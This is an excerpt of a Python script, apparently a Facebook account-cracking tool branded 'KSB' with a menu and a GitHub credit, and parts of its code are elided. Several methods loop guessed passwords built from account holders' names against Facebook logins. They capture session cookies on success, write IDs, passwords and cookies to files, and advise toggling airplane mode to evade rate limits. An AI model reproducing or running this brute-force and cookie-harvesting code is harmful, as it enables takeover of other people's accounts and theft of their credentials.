...
os.system('clear')
print(' Checking KSB Server Please Wait...  ');time.sleep(1)
try:
    import requests 
except ImportError:
    print('\n  installing Requests ...\n')
...
\33[1;37m--------------------------------------------------
 ...
 [~] Status    :  FREE
 [~]Github     :  Https://github.com/Khalid0311
\33[1;37m--------------------------------------------------""")
def clear():
	os.system('clear')
	print(logo)
...
def menu():
	...
	if riaz =='3':
		riaz_dump()
	if riaz =='4':
		os.system('xdg-open https://chat.whatsapp.com/Ii6xkMrhalzAasiuqb11BQ')
	if riaz =='5':
...
#<----[pass_list]------>           
    def pasw(self):       
            ...
            print(f"(Use Airplane Mode Every 5 Minutes)")
...
#<-----[Method~1]---->            
    def method1(self, rid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\x1b[1;97m [KSB-M1] {loop}|{len(self.id)} \x1b[1;92mOK: {len(oks)} {''.format(loop/float(len(self.id)))}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ...
                    print(f'\r\r\x1b[1;92m [KSB-OK] {rid} | {ps} \n \033[1;37mCookie : {cookie}\033[1;97m')
                    oks.append(rid)
                    open('/sdcard/KSB-OK.txt','a').write(rid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f'\r\r\x1b[1;91m [KSB-CP] {rid} | {ps}\033[1;97m')
                     cps.append(rid)
                     open('/sdcard/KSB-CP.txt','a').write(rid+'|'+ps+'\n')
                else:
                    continue 
            loop+=1
...
#<-----[Method~2]------>            
    def methodB(self, rid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\x1b[1;97m [KSB-M2] {loop}|{len(self.id)} \x1b[1;92mOK: {len(oks)} {''.format(loop/float(len(self.id)))}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);rsbhai = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"fh={rsbhai};{ckkk}"
                    print(f'\r\r\x1b[1;92m [KSB-OK] {rid} | {ps}\033[1;97m')
                    oks.append(rid)
                    open('/sdcard/KSB-OK.txt','a').write(rid+'|'+ps+'\n');open('/sdcard/REFAT_iDs_COOKiES_M1.txt','a').write(rid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f'\r\r\x1b[1;91m[KSB-CP] {rid} | {ps}\033[1;97m')
                     cps.append(rid)
...
#<----[Method~3]----->
    def method3(self, rid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\x1b[1;97m [KSB-M3] {loop}|{len(self.id)} \x1b[1;92mOK: {len(oks)} {''.format(loop/float(len(self.id)))}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			...
			sys.stdout.write(f'\r\x1b[1;97m [\033[1;97mK-S-B\033[1;97m] %s|\x1b[1;92mOK: %s \x1b[1;97m\r'%(loop,len(oks))),
			sys.stdout.flush()
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\033[1;92m [KSB-OK] '+cid+' | '+ps+'\033[1;32m')
				open('KSB.RNDM-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m [KSB-CP] '+cid+' | '+ps+'\33[0;97m')
				open('KSB.RNDM-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue 
